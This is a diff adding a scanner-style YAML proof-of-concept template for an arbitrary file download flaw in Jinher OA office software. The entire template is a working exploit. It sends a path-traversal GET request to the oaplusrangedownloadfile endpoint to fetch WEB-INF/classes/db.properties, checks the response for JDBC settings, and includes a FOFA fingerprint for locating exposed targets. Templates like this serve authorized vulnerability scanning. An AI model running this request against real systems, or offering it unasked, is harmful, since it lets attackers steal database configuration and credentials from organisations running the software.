@@ -1,0 +1,26 @@
+id: poc-yaml-jin-he-oaplusrangedownloadfile-anyfile-download
+info:
+  name: 金和OA oaplusrangedownloadfile 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金和OA 协同办公管理系统
+  fofa: app="Jinher-OA"
+requests:
+- method: GET
+  path: /jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties
+  expression: 'status_code == 200 &&
+
+    contains(body,"jc6.config=") &&
+
+    contains(body,"jdbc.") &&
+
+    !contains(body,"<") &&
+
+    contains(headers,"filename=\"db.properties\"") &&
+
+    contains(content_type,"application/octet-stream")
+
+    '
+variables: {}
+transport: http
